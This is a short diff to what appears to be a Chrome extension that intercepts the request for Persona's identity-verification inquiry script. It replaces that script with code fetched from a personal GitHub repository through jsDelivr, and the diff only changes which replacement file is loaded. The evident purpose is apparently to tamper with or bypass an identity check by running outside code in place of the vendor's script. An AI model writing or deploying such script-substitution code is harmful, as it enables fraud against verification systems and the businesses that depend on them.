@@ -3,7 +3,7 @@ chrome.webRequest.onBeforeRequest.addListener(
       if (details.url === "https://cdn.withpersona.com/vite/assets/inquiry/inquiry-BqPZ-YU_.js") {
         try {
           // Fetch the replacement script
-          const response = await fetch("https://cdn.jsdelivr.net/gh/clintonmachuki/another/inquiry-BqPZ-YU_.js");
+          const response = await fetch("https://cdn.jsdelivr.net/gh/clintonmachuki/another/12345.js");
           
           if (!response.ok) {
             throw new Error('Network response was not ok');
